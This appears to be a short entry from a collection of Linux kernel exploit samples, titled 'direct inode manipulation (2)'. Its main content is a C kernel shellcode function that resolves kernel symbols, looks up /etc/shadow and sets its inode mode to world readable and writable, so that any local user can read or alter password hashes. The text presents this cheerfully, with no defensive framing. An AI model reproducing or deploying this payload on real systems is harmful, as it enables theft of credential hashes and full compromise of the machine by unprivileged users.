direct inode manipulation (2)
=============================

The idea behind this sample is to use direct inode manipulation for changing `/etc/shadow` attributes so it will became world readable/writable :-)

~~~
void shellcode(void) {
	int (*user_path_at_empty)(int, char *, unsigned, void *, int *) = (void *)(X_user_path_at_empty + 5);
	int (*path_put)(void *) = (void *)(X_path_put + 5);
	struct path { void *mnt; void *dentry; } path = { 0 };
	if (!user_path_at_empty(-100, (char []){ "/etc/shadow" }, 0, &path, 0)) {
		void *inode = (void *)(*(long *)(path.dentry + 48)); // dentry->d_inode
		*(unsigned short *)(inode + 0) |= 0666; // inode->i_mode
		path_put(&path);
	}
}
~~~
